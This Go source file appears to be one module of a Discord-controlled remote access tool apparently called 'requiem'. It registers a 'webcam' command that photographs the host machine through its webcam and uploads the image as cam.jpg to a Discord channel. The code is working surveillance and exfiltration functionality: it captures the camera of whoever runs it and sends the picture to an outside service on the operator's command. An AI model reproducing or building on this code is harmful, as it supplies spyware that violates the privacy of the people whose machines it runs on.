package commands

import (
	"fmt"

	"requiem/funcs"
	"requiem/store"

	"github.com/bwmarrin/discordgo"
)

func (*CamCommand) Exec(ctx *store.CommandContext, args []string) {
	pic, err := funcs.CaptureWebcam()
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to capture - %s", err))
		return
	}

	ctx.SendComplexMsg(&discordgo.MessageSend{
		Reference: ctx.Message.Reference(),
		Files: []*discordgo.File{{
			Name:   "cam.jpg",
			Reader: pic,
		}},
	})
}

func (*CamCommand) Name() string {
	return "webcam"
}

func (*CamCommand) Info() string {
	return "Takes a picture from the webcam."
}

type CamCommand struct{}
